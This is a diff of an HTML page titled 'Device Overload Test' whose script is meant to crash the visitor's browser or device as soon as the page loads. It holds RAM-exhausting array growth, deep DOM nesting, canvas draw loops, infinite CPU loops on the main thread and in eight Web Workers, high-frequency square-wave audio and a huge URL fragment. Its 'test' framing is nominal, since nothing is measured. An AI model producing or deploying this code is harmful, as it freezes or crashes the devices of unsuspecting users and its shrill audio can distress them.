@@ -1,90 +1,95 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>💥 MAX Crash</title>
+  <title> Device Overload Test</title>
   <style>
     body {
       background: black;
-      color: lime;
+      color: #0f0;
       font-family: monospace;
-      margin: 0;
       overflow: hidden;
+    }
+    canvas {
+      position: absolute;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
     }
   </style>
 </head>
 <body>
-  <h1>🚨 MAXIMUM BROWSER OVERLOAD 🚨</h1>
-  <canvas id="c"></canvas>
+  <h1>🔥 Overloading Device...</h1>
+  <canvas id="gpuCanvas"></canvas>
   <script>
-    // ⚠️ 1. Massive RAM allocation
-    let hugeArray = [];
-    try {
-      for (let i = 0; i < 1e7; i++) {
-        hugeArray.push("💥".repeat(1024)); // 1 KB per item
-      }
-    } catch (e) {
-      console.warn("RAM allocation failed:", e);
+    // 1. 🔥 Massive RAM Loader: Exponential memory balloon
+    let ramEater = ["💣".repeat(1000)];
+    for (let i = 0; i < 200; i++) {
+      ramEater.push(ramEater.concat(ramEater));
     }
 
-    // ⚠️ 2. Infinite CPU loop on main thread
-    function burnCPU() {
-      while (true) {
-        let x = Math.pow(Math.random(), Math.random()) * Date.now();
-      }
-    }
-
-    // ⚠️ 3. DOM flooding with nested elements
-    const container = document.createElement("div");
-    document.body.appendChild(container);
+    // 2. 🔁 Infinite DOM Nesting: Triggers recursive layout engine calls
+    const root = document.createElement("div");
+    document.body.appendChild(root);
+    let parent = root;
     for (let i = 0; i < 10000; i++) {
-      const d = document.createElement("div");
-      d.innerHTML = `<span>${"🔥".repeat(500)}</span>`;
-      container.appendChild(d);
+      const child = document.createElement("div");
+      child.innerHTML = `<span>${"🔥".repeat(100)}</span>`;
+      parent.appendChild(child);
+      parent = child;
     }
 
-    // ⚠️ 4. Canvas GPU spam (fill full screen with thousands of colored rects)
-    const canvas = document.getElementById("c");
+    // 3. 🎨 GPU Canvas Spam
+    const canvas = document.getElementById("gpuCanvas");
+    const ctx = canvas.getContext("2d");
     canvas.width = window.innerWidth;
     canvas.height = window.innerHeight;
-    const ctx = canvas.getContext("2d");
 
-    function drawGPU() {
-      for (let i = 0; i < 50000; i++) {
-        ctx.fillStyle = `rgba(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255}, 0.5)`;
-        ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 3, 3);
+    function smashGPU() {
+      for (let i = 0; i < 100000; i++) {
+        ctx.fillStyle = `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},1)`;
+        ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 2, 2);
       }
-      requestAnimationFrame(drawGPU);
+      requestAnimationFrame(smashGPU);
     }
-    drawGPU();
+    smashGPU();
 
-    // ⚠️ 5. Audio overload
-    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-    for (let i = 0; i < 4; i++) {
-      const osc = audioCtx.createOscillator();
-      osc.type = "square";
-      osc.frequency.setValueAtTime(18000 + Math.random()*1000, audioCtx.currentTime);
-      osc.connect(audioCtx.destination);
-      osc.start();
-      osc.stop(audioCtx.currentTime + 0.5);
-    }
-
-    // ⚠️ 6. URL fragment bomb
-    history.pushState({}, "", "#" + "X".repeat(50000));
-
-    // ⚠️ 7. Web Worker CPU bomb (if supported)
-    const workerCode = `
+    // 4. ⚙️ Main CPU Loop (recursive burn)
+    function burnCPU(depth = 0) {
       while (true) {
-        Math.sqrt(Math.random() * Date.now());
+        Math.sqrt(Math.random() * Date.now()) + depth;
       }
-    `;
-    const blob = new Blob([workerCode], { type: 'application/javascript' });
-    const url = URL.createObjectURL(blob);
-    for (let i = 0; i < 4; i++) {
-      new Worker(url);
     }
 
-    // ⚠️ 8. CPU loop (trigger last)
-    setTimeout(burnCPU, 1);
+    // 5. 👷 Web Workers (4 threads)
+    const workerBlob = new Blob([`while(true){Math.tan(Math.random()*Date.now())}`], {type: "application/javascript"});
+    const workerURL = URL.createObjectURL(workerBlob);
+    for (let i = 0; i < 8; i++) new Worker(workerURL);
+
+    // 6. 🔊 Audio Oscillators
+    try {
+      const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+      for (let i = 0; i < 6; i++) {
+        const osc = audioCtx.createOscillator();
+        osc.type = "square";
+        osc.frequency.setValueAtTime(18000 + i * 100, audioCtx.currentTime);
+        osc.connect(audioCtx.destination);
+        osc.start();
+        osc.stop(audioCtx.currentTime + 1);
+      }
+    } catch (e) {}
+
+    // 7. 🚨 Fragment Overwrite (URL bomb)
+    history.pushState({}, "", "#" + "X".repeat(500000));
+
+    // 8. 🧠 Optional LocalStorage (commented, can crash Safari Mobile if repeated)
+    // try {
+    //   for (let i = 0; i < 10000; i++) {
+    //     localStorage.setItem(`key${i}`, "🧨".repeat(5000));
+    //   }
+    // } catch (e) {}
+
+    // 9. 🔥 Launch the final CPU meltdown
+    setTimeout(() => burnCPU(), 50);
 
   </script>
 </body>
